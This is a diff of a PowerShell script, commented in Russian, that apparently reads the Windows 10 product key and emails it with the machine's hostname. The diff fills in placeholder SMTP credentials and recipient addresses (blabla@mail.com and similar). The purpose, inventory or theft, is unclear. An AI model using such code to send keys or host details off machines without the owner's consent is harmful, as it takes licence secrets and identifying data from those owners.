@@ -95,14 +95,14 @@ Function ConvertToKey($Key)
 }
 GetWin10Key
 #укажите логин пароль
-$Username = "";
-$Password = "";
+$Username = "Username";
+$Password = "Password";
 sleep 1
 function Send-ToEmail([string]$email)
 
 {
     $message = new-object Net.Mail.MailMessage;
-    $message.From = "";
+    $message.From = "blabla@mail.com";
     $message.To.Add($email);
     $COMPUTERNAME_FQDN=[System.Net.Dns]::GetHostByName($env:computerName).HostName
     $message.Subject = "Windows Key from "+ $COMPUTERNAME_FQDN;
@@ -119,6 +119,7 @@ function Send-ToEmail([string]$email)
  }
 
 #укажите email куда нужно отправить ключи
-Send-ToEmail  -email "to";
-Send-ToEmail  -email "to";
+Send-ToEmail  -email "toblabla@mail.com";
+sleep 1
+Send-ToEmail  -email "toblabla2@mail.com";
 sleep 2
